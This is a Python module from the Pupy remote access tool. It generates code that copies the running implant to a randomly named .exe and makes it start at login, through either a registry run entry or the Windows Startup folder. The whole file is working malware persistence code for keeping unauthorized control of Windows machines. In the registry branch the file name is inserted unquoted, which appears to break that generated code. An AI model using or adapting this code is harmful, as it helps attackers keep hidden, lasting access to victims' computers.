#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
import textwrap, random, string
from scriptlets import *

class ScriptletGenerator(Scriptlet):
    """ copy the current pupy executable to a random exe in %TEMP% and add persistency through registry """

    dependencies=[("windows/all/pupwinutils/persistence.py","pupwinutils.persistence")]
    arguments={
        'method': 'available methods: registry, startup'
    }

    def __init__(self, method="registry"):
        if not method in ("registry", "startup"):
            raise ScriptletArgumentError("unknown persistence method %s"%method)
        self.method=method

    def generate(self):
        name=''.join(random.choice(string.ascii_lowercase) for _ in range(0,7))+".exe"
        if self.method=="registry":
            return textwrap.dedent("""
            import sys, shutil, os.path
            if sys.platform=="win32":
                import pupwinutils.persistence
                path=os.path.join(os.path.expandvars("%TEMP%"), {})
                shutil.copy(sys.executable, path)
                pupwinutils.persistence.add_registry_startup(path)
            """.format(name))
        else:
            return textwrap.dedent("""
            import sys, shutil, os.path
            if sys.platform=="win32":
                shutil.copy(sys.executable, os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}"))
            """.format(name))


